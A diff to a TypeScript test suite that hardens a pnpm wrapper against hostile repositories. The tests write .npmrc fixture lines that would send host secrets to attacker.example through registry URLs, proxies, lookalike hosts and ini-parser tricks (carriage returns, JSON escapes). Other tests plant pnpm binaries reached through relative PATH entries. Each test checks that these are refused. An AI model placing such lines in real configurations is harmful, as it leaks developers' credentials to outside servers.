@@ -53,6 +53,7 @@ const makePnpm = (projectRoot: string, executable: string, options: {
   readonly environment?: Readonly<Record<string, string | undefined>>
   readonly timeoutMs?: number
   readonly storeDirectory?: string
+  readonly credentialHosts?: ReadonlyArray<string> | undefined
 } = {}) =>
   Effect.runPromise(
     PackageManager.makePnpm({
@@ -61,7 +62,10 @@ const makePnpm = (projectRoot: string, executable: string, options: {
       executable,
       environment: options.environment ?? process.env,
       timeoutMs: options.timeoutMs,
-      storeDirectory: options.storeDirectory
+      storeDirectory: options.storeDirectory,
+      // The fixtures bind credentials to registry.example; tests of the
+      // default pass `credentialHosts: undefined` explicitly.
+      credentialHosts: "credentialHosts" in options ? options.credentialHosts : ["registry.example"]
     }).pipe(Effect.provide(ExecutableFixture.layer), Effect.provide(runtimeLayer))
   )
 
@@ -292,7 +296,7 @@ describe("PackageManager.storeRoot", () => {
       const other = await Fs.mkdtemp(NodePath.join(Os.tmpdir(), "smthrs-mutated-root-"))
       try {
         const executable = NodePath.join(root, "pnpm.mjs")
-        await Fs.writeFile(NodePath.join(root, ".npmrc"), "token=${NPM_TOKEN}\n", "utf8")
+        await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${NPM_TOKEN}\n", "utf8")
         await writeExecutable(
           executable,
           "process.stdout.write(`${process.cwd()}|${process.env.NPM_TOKEN}\\n`)"
@@ -301,11 +305,13 @@ describe("PackageManager.storeRoot", () => {
           NPM_TOKEN: "original",
           PATH: process.env.PATH
         }
+        const credentialHosts = ["registry.example"]
         const options = {
           requirement: "11.21.0",
           projectRoot: root,
           executable,
-          environment
+          environment,
+          credentialHosts
         }
         const manager = await Effect.runPromise(
           PackageManager.makePnpm(options).pipe(
@@ -315,6 +321,7 @@ describe("PackageManager.storeRoot", () => {
         )
         options.projectRoot = other
         environment.NPM_TOKEN = "mutated"
+        credentialHosts[0] = "elsewhere.example"
 
         expect(await Effect.runPromise(manager.version)).toBe(`${root}|original`)
         expect(manager.projectRoot).toBe(root)
@@ -453,16 +460,19 @@ describe("PackageManager.storeRoot", () => {
           "userconfig: process.env.NPM_CONFIG_USERCONFIG" +
           "}))"
       )
+      // Relative PATH entries are dropped before spawning, so hand in only absolute ones.
+      const path = (process.env.PATH ?? "").split(NodePath.delimiter).filter((entry) => NodePath.isAbsolute(entry))
+        .join(NodePath.delimiter)
       const manager = await makePnpm(root, executable, {
         environment: {
-          PATH: process.env.PATH,
+          PATH: path,
           HOME: "/hidden/home",
           NPM_TOKEN: "declared-token",
           UNRELATED_SECRET: "must-not-leak"
         }
       })
       const observed = JSON.parse(await Effect.runPromise(manager.version)) as Record<string, unknown>
-      expect(observed.path).toBe(process.env.PATH)
+      expect(observed.path).toBe(path)
       expect(observed.token).toBe("declared-token")
       expect(observed.secret).toBeUndefined()
       expect(observed.home).toBeUndefined()
@@ -478,8 +488,6 @@ describe("PackageManager.storeRoot", () => {
         [
           "  ; _authToken=${LEGACY_SECRET}",
           "  # proxy=${PROXY_CREDENTIAL}",
-          "${KEY_SECRET}=unused",
-          "${BARE_SECRET}",
           "",
           "//registry.example/:_authToken=${NPM_TOKEN}"
         ].join("\n"),
@@ -491,16 +499,383 @@ describe("PackageManager.storeRoot", () => {
           PATH: process.env.PATH,
           LEGACY_SECRET: "comment-only",
           PROXY_CREDENTIAL: "comment-only",
-          KEY_SECRET: "key-only",
-          BARE_SECRET: "not-a-setting",
           NPM_TOKEN: "live-token"
         }
       })
       const observed = JSON.parse(await Effect.runPromise(manager.version)) as Record<string, unknown>
       expect(observed.NPM_TOKEN).toBe("live-token")
-      for (const name of ["LEGACY_SECRET", "PROXY_CREDENTIAL", "KEY_SECRET", "BARE_SECRET"]) {
+      for (const name of ["LEGACY_SECRET", "PROXY_CREDENTIAL"]) {
         expect(observed).not.toHaveProperty(name)
       }
+    })
+  })
+
+  /**
+   * pnpm expands `${NAME}` in every `.npmrc` value, and every referenced name
+   * was forwarded. A repository could spell a host secret into a registry URL
+   * or an unscoped credential that follows `registry=`, and `pnpm fetch` sent
+   * it to a server the repository chose.
+   */
+  it.each([
+    "registry=https://attacker.example/${AWS_SECRET_ACCESS_KEY}/",
+    "@scope:registry=https://${AWS_SECRET_ACCESS_KEY}.attacker.example/",
+    "https-proxy=http://attacker.example/${AWS_SECRET_ACCESS_KEY}",
+    "_authToken=${AWS_SECRET_ACCESS_KEY}",
+    "//registry.example/:_authToken=prefix-${AWS_SECRET_ACCESS_KEY}",
+    "//registry.example/:ca=${AWS_SECRET_ACCESS_KEY}"
+  ])("refuses a placeholder outside a registry-scoped credential: %s", async (line) => {
+    await withFixture("package-manager-placeholder-exfil", async (root) => {
+      await Fs.writeFile(NodePath.join(root, ".npmrc"), `${line}\n`, "utf8")
+      const refusal = await Effect.runPromise(
+        PackageManager.npmrcDigest(root).pipe(Effect.flip, Effect.provide(ExecutableFixture.layer))
+      )
+      expect(refusal.code).toBe("unsafe_configuration")
+      const executable = NodePath.join(root, "pnpm.mjs")
+      const marker = NodePath.join(root, "spawned")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
+          JSON.stringify(marker)
+        }, String(process.env.AWS_SECRET_ACCESS_KEY))`
+      )
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, AWS_SECRET_ACCESS_KEY: "host-secret" }
+      })
+      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/environment placeholder|embeds a credential/)
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  /**
+   * A registry-scoped credential names its own host, and the repository
+   * writes that host. Pairing it with `registry=` sent the host variable to
+   * a server the checkout chose.
+   */
+  it.each(
+    [
+      ["default list", undefined, "//attacker.example/:_authToken=${GITHUB_TOKEN}"],
+      ["operator list", ["registry.example"], "//attacker.example/:_authToken=${GITHUB_TOKEN}"],
+      ["lookalike host", undefined, "//registry.npmjs.org.attacker.example/:_authToken=${GITHUB_TOKEN}"],
+      ["host without path", undefined, "//registry.npmjs.org:_authToken=${GITHUB_TOKEN}"],
+      ["port mismatch", ["registry.example"], "//registry.example:8443/:_authToken=${GITHUB_TOKEN}"]
+    ] as const
+  )("refuses a credential bound to a host outside credentialHosts: %s", async (_label, hosts, line) => {
+    await withFixture("package-manager-credential-host", async (root) => {
+      await Fs.writeFile(
+        NodePath.join(root, ".npmrc"),
+        `registry=https://attacker.example/\n${line}\n`,
+        "utf8"
+      )
+      const executable = NodePath.join(root, "pnpm.mjs")
+      const marker = NodePath.join(root, "spawned")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
+          JSON.stringify(marker)
+        }, String(process.env.GITHUB_TOKEN))`
+      )
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" },
+        credentialHosts: hosts
+      })
+      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/outside credentialHosts/)
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  it("forwards a credential bound to an allowed host, matched case-insensitively", async () => {
+    await withFixture("package-manager-credential-host-allowed", async (root) => {
+      await Fs.writeFile(
+        NodePath.join(root, ".npmrc"),
+        "//Registry.NPMJS.org/:_authToken=${NPM_TOKEN}\n//npm.pkg.example:8443/scope/:_authToken=${SCOPE_TOKEN}\n",
+        "utf8"
+      )
+      const executable = NodePath.join(root, "pnpm.mjs")
+      const marker = NodePath.join(root, "spawned")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
+          JSON.stringify(marker)
+        }, [process.env.NPM_TOKEN, process.env.SCOPE_TOKEN].join(","))\nconsole.log("11.21.0")`
+      )
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, NPM_TOKEN: "a", SCOPE_TOKEN: "b" },
+        credentialHosts: ["registry.npmjs.org", "NPM.pkg.example:8443"]
+      })
+      await Effect.runPromise(manager.version).catch(() => undefined)
+      expect(await Fs.readFile(marker, "utf8")).toBe("a,b")
+    })
+  })
+
+  it("rejects a malformed credentialHosts option", async () => {
+    await withFixture("package-manager-credential-host-invalid", async (root) => {
+      for (const hosts of [["https://registry.npmjs.org"], ["a/b"], "registry.npmjs.org"]) {
+        await expect(
+          makePnpm(root, "pnpm", { credentialHosts: hosts as unknown as ReadonlyArray<string> })
+        ).rejects.toThrow(/credentialHosts/)
+      }
+    })
+  })
+
+  /**
+   * pnpm reads `.npmrc` with the `ini` decoder: it splits lines on `\r` as well
+   * as `\n` and runs quoted values through `JSON.parse`. A setting our parser
+   * could not see passed the checks, `GITHUB_TOKEN` was forwarded for the
+   * allowed host, and pnpm sent it inside the hidden `registry=` URL.
+   */
+  it.each(
+    [
+      ["carriage-return line", "#x\rregistry=https://attacker.example/${GITHUB_TOKEN}/"],
+      ["lone carriage return", "\rregistry=https://attacker.example/${GITHUB_TOKEN}/\r"],
+      ["JSON escape in a quoted value", "registry=\"https://attacker.example/\\u0024{GITHUB_TOKEN}/\""],
+      ["JSON escape in a single-quoted value", "registry='\"https://attacker.example/\\u0024{GITHUB_TOKEN}/\"'"],
+      ["placeholder in a setting name", "//registry.example/${GITHUB_TOKEN}/:_authToken=${GITHUB_TOKEN}"],
+      ["placeholder as a whole setting name", "${GITHUB_TOKEN}=unused"],
+      ["bare placeholder line", "${GITHUB_TOKEN}"]
+    ] as const
+  )("refuses a placeholder pnpm's ini parser sees: %s", async (_label, line) => {
+    await withFixture("package-manager-ini-divergence", async (root) => {
+      await Fs.writeFile(
+        NodePath.join(root, ".npmrc"),
+        `//registry.example/:_authToken=\${GITHUB_TOKEN}\n${line}\n`,
+        "utf8"
+      )
+      const refusal = await Effect.runPromise(
+        PackageManager.npmrcDigest(root).pipe(Effect.flip, Effect.provide(ExecutableFixture.layer))
+      )
+      expect(refusal.code).toBe("unsafe_configuration")
+      const executable = NodePath.join(root, "pnpm.mjs")
+      const marker = NodePath.join(root, "spawned")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
+          JSON.stringify(marker)
+        }, String(process.env.GITHUB_TOKEN))`
+      )
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
+      })
+      await expect(Effect.runPromise(manager.version)).rejects.toMatchObject({ code: "unsafe_configuration" })
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  /**
+   * The credential is bound to an allowed host, but a repository proxy still
+   * received it (pnpm 10 sent `Authorization: Bearer <secret>` to a capturing
+   * proxy for `registry=http://registry.npmjs.org/`).
+   */
+  it.each([
+    "proxy=http://attacker.example:8080/",
+    "https-proxy=http://attacker.example:8080/",
+    "HTTP-PROXY=http://attacker.example:8080/",
+    "noproxy=*",
+    "strict-ssl=false",
+    "ca=\"-----BEGIN CERTIFICATE-----\"",
+    "cafile=evil.pem",
+    "registry=http://registry.example/",
+    "@scope:registry=http://registry.example/",
+    "#x\rhttps-proxy=http://attacker.example:8080/"
+  ])("refuses a transport setting beside a forwarded credential: %s", async (line) => {
+    await withFixture("package-manager-transport", async (root) => {
+      await Fs.writeFile(
+        NodePath.join(root, ".npmrc"),
+        `//registry.example/:_authToken=\${GITHUB_TOKEN}\n${line}\n`,
+        "utf8"
+      )
+      const executable = NodePath.join(root, "pnpm.mjs")
+      const marker = NodePath.join(root, "spawned")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
+          JSON.stringify(marker)
+        }, String(process.env.GITHUB_TOKEN))`
+      )
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
+      })
+      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/changes how a forwarded credential travels/)
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  it("keeps a transport setting when no credential is forwarded", async () => {
+    await withFixture("package-manager-transport-plain", async (root) => {
+      await Fs.writeFile(
+        NodePath.join(root, ".npmrc"),
+        "registry=http://registry.example/\nhttps-proxy=http://proxy.example:8080/\n",
+        "utf8"
+      )
+      const executable = NodePath.join(root, "pnpm.mjs")
+      await writeExecutable(executable, `console.log("11.21.0")`)
+      const manager = await makePnpm(root, executable, { environment: { PATH: process.env.PATH } })
+      expect(await Effect.runPromise(manager.version)).toBe("11.21.0")
+    })
+  })
+
+  /**
+   * pnpm 10 also reads `httpsProxy`, `httpProxy`, and `strictSsl` from
+   * `pnpm-workspace.yaml`, and there they outrank the environment. Only
+   * command-line settings outrank them, so a forwarded credential pins every
+   * transport setting there, from the operator's own variables.
+   */
+  it("pins transport settings on the command line only while a credential is forwarded", async () => {
+    await withFixture("package-manager-transport-pins", async (root) => {
+      const executable = NodePath.join(root, "pnpm.mjs")
+      await writeExecutable(
+        executable,
+        `import { appendFileSync } from "node:fs"\n` +
+          `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
+          `appendFileSync("calls", JSON.stringify(process.argv.slice(2)) + "\\n")`
+      )
+      await Fs.writeFile(
+        NodePath.join(root, "pnpm-workspace.yaml"),
+        "httpsProxy: http://attacker.example:8080/\nstrictSsl: false\n"
+      )
+      const calls = async () =>
+        (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
+          .map((line) => JSON.parse(line) as Array<string>)
+      const pins = (args: Array<string>) => args.filter((arg) => arg.startsWith("--config."))
+      await Effect.runPromise((await makePnpm(root, executable, { environment: { PATH: process.env.PATH } })).fetch)
+      expect(pins((await calls())[0]!)).toEqual([])
+      await Fs.rm(NodePath.join(root, "calls"))
+      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${GITHUB_TOKEN}\n", "utf8")
+      const operator = await makePnpm(root, executable, {
+        environment: {
+          PATH: process.env.PATH,
+          GITHUB_TOKEN: "host-secret",
+          https_proxy: "http://operator.example:3128/",
+          NO_PROXY: "internal.example"
+        }
+      })
+      await Effect.runPromise(operator.fetch)
+      await Effect.runPromise(operator.link)
+      const unproxied = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
+      })
+      await Effect.runPromise(unproxied.fetch)
+      expect((await calls()).map(pins)).toEqual([
+        [
+          "--config.proxy=",
+          "--config.https-proxy=http://operator.example:3128/",
+          "--config.http-proxy=http://operator.example:3128/",
+          "--config.noproxy=internal.example",
+          "--config.strict-ssl=true",
+          "--config.ca="
+        ],
+        [
+          "--config.proxy=",
+          "--config.https-proxy=http://operator.example:3128/",
+          "--config.http-proxy=http://operator.example:3128/",
+          "--config.noproxy=internal.example",
+          "--config.strict-ssl=true",
+          "--config.ca="
+        ],
+        [
+          "--config.proxy=",
+          "--config.https-proxy=",
+          "--config.http-proxy=",
+          "--config.noproxy=",
+          "--config.strict-ssl=true",
+          "--config.ca="
+        ]
+      ])
+    })
+  })
+
+  /**
+   * The child's cwd is the project root, so a relative or empty `PATH` entry
+   * resolved `pnpm` to a file the repository planted there.
+   */
+  it.skipIf(process.platform === "win32")("never resolves pnpm through a relative PATH entry", async () => {
+    await withFixture("package-manager-relative-path", async (root) => {
+      const marker = NodePath.join(root, "planted-ran")
+      await Fs.mkdir(NodePath.join(root, "bin"))
+      for (const planted of [NodePath.join(root, "pnpm"), NodePath.join(root, "bin/pnpm")]) {
+        await Fs.writeFile(planted, `#!/bin/sh\necho planted > ${JSON.stringify(marker)}\necho 11.21.0\n`, "utf8")
+        await Fs.chmod(planted, 0o755)
+      }
+      const observed = NodePath.join(root, "observed-path")
+      const executable = NodePath.join(root, "probe.mjs")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(observed)}, process.env.PATH ?? "")`
+      )
+      const probe = await makePnpm(root, executable, { environment: { PATH: `.:bin::/usr/bin:` } })
+      await Effect.runPromise(probe.version).catch(() => undefined)
+      expect(await Fs.readFile(observed, "utf8")).toBe("/usr/bin")
+      const manager = await makePnpm(root, "pnpm", { environment: { PATH: ".:bin:" } })
+      await expect(Effect.runPromise(manager.version)).rejects.toThrow()
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  it("refuses a Windows pnpm.cmd shim reached through a relative PATH entry", async () => {
+    await withFixture("package-manager-windows-relative", async (root) => {
+      const bin = NodePath.join(root, "tools")
+      const entry = NodePath.join(bin, "node_modules/pnpm/bin/pnpm.cjs")
+      const marker = NodePath.join(root, "planted-ran")
+      await Fs.mkdir(NodePath.dirname(entry), { recursive: true })
+      await Fs.writeFile(NodePath.join(bin, "pnpm.cmd"), "@echo planted\n")
+      await Fs.writeFile(entry, `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "yes")`)
+      const error = await Effect.runPromise(
+        PackageManager.makePnpm({
+          requirement: "11.21.0",
+          projectRoot: root,
+          environment: { Path: "tools;.", SystemRoot: process.env.SystemRoot }
+        }).pipe(
+          Effect.flatMap((manager) => manager.version),
+          Effect.flip,
+          Effect.provide(ExecutableFixture.layer),
+          Effect.provide(Runtime.layerNoop("node", {
+            requirement: ">=22.19.0",
+            version: "24.9.0",
+            executable: process.execPath,
+            platform: { ...platform, os: "win32" }
+          }))
+        )
+      )
+      expect(error.code).toBe("environment_mismatch")
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  /**
+   * pnpm also loads hooks named by `pnpmfile` or `globalPnpmfile` in
+   * `pnpm-workspace.yaml`, which the store manifest never digested, so an edit
+   * to such a hook neither invalidated a fetch nor showed in any declared read.
+   * Every command names the one default hook file pnpm would load (the
+   * measured one) and clears the global hook, or turns hooks off.
+   */
+  it("pins pnpm hooks to the measured default hook file", async () => {
+    await withFixture("package-manager-pnpmfile", async (root) => {
+      const executable = NodePath.join(root, "pnpm.mjs")
+      await writeExecutable(
+        executable,
+        `import { appendFileSync } from "node:fs"\n` +
+          `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
+          `appendFileSync("calls", JSON.stringify(process.argv.slice(2)) + "\\n")`
+      )
+      await Fs.writeFile(NodePath.join(root, "pnpm-workspace.yaml"), "pnpmfile: hook.cjs\nglobalPnpmfile: hook.cjs\n")
+      await Fs.writeFile(NodePath.join(root, ".pnpmfile.cjs"), "module.exports = { hooks: {} }\n")
+      const manager = await makePnpm(root, executable)
+      await Effect.runPromise(manager.fetch)
+      await Effect.runPromise(manager.link)
+      await Fs.writeFile(NodePath.join(root, ".pnpmfile.mjs"), "export const hooks = {}\n")
+      await Effect.runPromise(manager.fetch)
+      await Fs.rm(NodePath.join(root, ".pnpmfile.cjs"))
+      await Fs.rm(NodePath.join(root, ".pnpmfile.mjs"))
+      await Effect.runPromise(manager.fetch)
+      const calls = (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
+        .map((line) => JSON.parse(line) as Array<string>)
+      const hooks = (args: Array<string>) => args.slice(args.indexOf("--reporter=append-only") + 1, -2)
+      const pinned = (name: string) => ["--pnpmfile", `${root}/${name}`, "--global-pnpmfile="]
+      expect(calls.map(hooks)).toEqual([
+        pinned(".pnpmfile.cjs"),
+        pinned(".pnpmfile.cjs"),
+        pinned(".pnpmfile.mjs"),
+        ["--ignore-pnpmfile"]
+      ])
     })
   })
 
@@ -568,6 +943,7 @@ describe("PackageManager.storeRoot", () => {
           "--frozen-lockfile",
           "--ignore-scripts",
           "--reporter=append-only",
+          "--ignore-pnpmfile",
           "--store-dir",
           `${root}/.flows/store/pnpm`
         ],
@@ -577,6 +953,7 @@ describe("PackageManager.storeRoot", () => {
           "--frozen-lockfile",
           "--ignore-scripts",
           "--reporter=append-only",
+          "--ignore-pnpmfile",
           "--store-dir",
           `${root}/.flows/store/pnpm`
         ]
@@ -742,7 +1119,8 @@ describe("PackageManager.storeRoot", () => {
           projectRoot: root,
           executable,
           environment: {
-            Path: process.env.PATH,
+            // One absolute entry: a relative PATH entry is dropped before spawning.
+            Path: NodePath.dirname(process.execPath),
             "ProgramFiles(x86)": "C:\\Program Files (x86)",
             "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files"
           }
@@ -784,6 +1162,7 @@ describe("PackageManager.storeRoot", () => {
         "--frozen-lockfile",
         "--ignore-scripts",
         "--reporter=append-only",
+        "--ignore-pnpmfile",
         "--store-dir"
       ])
       expect(NodePath.resolve(args.at(-1)!)).toBe(NodePath.join(root, ".flows/store/pnpm"))
@@ -808,13 +1187,22 @@ describe("PackageManager.storeRoot", () => {
         const calls = (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
           .map((line) => JSON.parse(line) as Array<string>)
         expect(calls).toEqual([
-          ["fetch", "--frozen-lockfile", "--ignore-scripts", "--reporter=append-only", "--store-dir", store],
+          [
+            "fetch",
+            "--frozen-lockfile",
+            "--ignore-scripts",
+            "--reporter=append-only",
+            "--ignore-pnpmfile",
+            "--store-dir",
+            store
+          ],
           [
             "install",
             "--offline",
             "--frozen-lockfile",
             "--ignore-scripts",
             "--reporter=append-only",
+            "--ignore-pnpmfile",
             "--store-dir",
             store
           ]
@@ -868,7 +1256,7 @@ describe("PackageManager.storeRoot", () => {
   ])("refuses .npmrc references that can mutate the child runtime: %s", async (name) => {
     await withFixture("package-manager-env-control", async (root) => {
       const executable = NodePath.join(root, "pnpm.mjs")
-      await Fs.writeFile(NodePath.join(root, ".npmrc"), `registry=\${${name}}\n`, "utf8")
+      await Fs.writeFile(NodePath.join(root, ".npmrc"), `//registry.example/:_authToken=\${${name}}\n`, "utf8")
       await writeExecutable(executable, "process.stdout.write('9.15.0\\n')")
       const manager = await makePnpm(root, executable, {
         environment: { PATH: process.env.PATH, [name]: "test-control-value" }
@@ -1467,9 +1855,9 @@ describe("PackageManager project configuration", () => {
     await withFixture("package-manager-placeholder", async (root) => {
       for (
         const line of [
-          "_password=${NPM_PASSWORD}",
-          "key=${NPM_KEY}",
-          "otp=${NPM_OTP}",
+          "//registry.example/:_password=${NPM_PASSWORD}",
+          "//registry.example/:username=${NPM_USER}",
+          "//registry.example/:_auth=${NPM_AUTH}",
           "//registry.example/:_authToken=${NPM_TOKEN}",
           "//registry.example/:_authToken=\"${NPM_TOKEN}\"",
           "//registry.example/:_authToken='${NPM_TOKEN}'",
@@ -1494,7 +1882,7 @@ describe("PackageManager project configuration", () => {
     await withFixture("package-manager-proto-name", async (root) => {
       const executable = NodePath.join(root, "pnpm.mjs")
       const observed = NodePath.join(root, "observed.json")
-      await Fs.writeFile(NodePath.join(root, ".npmrc"), "registry=https://${constructor}.example/\n", "utf8")
+      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${constructor}\n", "utf8")
       await writeExecutable(
         executable,
         `import { writeFileSync } from "node:fs"\n` +
@@ -1692,6 +2080,7 @@ describe("PackageManager link", () => {
         "--frozen-lockfile",
         "--ignore-scripts",
         "--reporter=append-only",
+        "--ignore-pnpmfile",
         "--store-dir"
       ])
       expect(NodePath.resolve(args.at(-1)!)).toBe(NodePath.join(root, ".flows/store/pnpm"))
